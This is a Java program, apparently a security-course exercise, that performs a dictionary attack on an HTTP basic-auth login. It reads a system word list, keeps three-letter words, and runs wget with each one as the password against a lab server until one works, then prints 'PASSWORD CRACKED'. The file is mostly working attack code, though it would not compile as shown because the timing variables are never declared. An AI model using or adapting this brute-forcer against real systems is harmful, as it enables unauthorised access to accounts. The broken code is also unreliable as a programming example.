
import java.io.*;

public class Dictionary
{
   
   public static void main(String args[])throws Exception
   {
        String s = null;
        String pass="";
        int at=0;
        String strLine="";
        int i=0;

        BufferedReader in = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));
        
        start =System.currentTimeMillis();
        try
        {
             while((pass=strLine = in.readLine()) != null)
             {
                
                if(pass.length()==3)
                {

                     System.out.println(pass);
                     at++;
                     
                     Process p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
                     p.waitFor();
                     i = p.exitValue();

                     if(i==0)
                     {
                              finish=System.currentTimeMillis();
                             
                             float time=finish-start;

                             System.out.println("PASSWORD CRACKED:"+ pass + " in " + at + " attempts " );
                             System.out.println("PASSWORD CRACKED:"+ pass + " in " + time + " milliseconds " );
                             System.exit(0);
                     }


                     BufferedReader stdInput = new BufferedReader(new
                      InputStreamReader(p.getInputStream()));

                     BufferedReader stdError = new BufferedReader(new
                      InputStreamReader(p.getErrorStream()));

                     

                     System.out.println("Standard output of the command ");
                     while ((s = stdInput.readLine()) != null)
                     {
                           System.out.println(s);
                     }

                     
                     System.out.println("Standard error of the command ");
                     while ((s = stdError.readLine()) != null)
                     {
                        System.out.println(s);
                     }
               }
          }
            System.exit(0);
        }
        catch (IOException e)
        {
            System.out.println("Exception happened ");
            e.printStackTrace();
            System.exit(-1);
        }
    }
}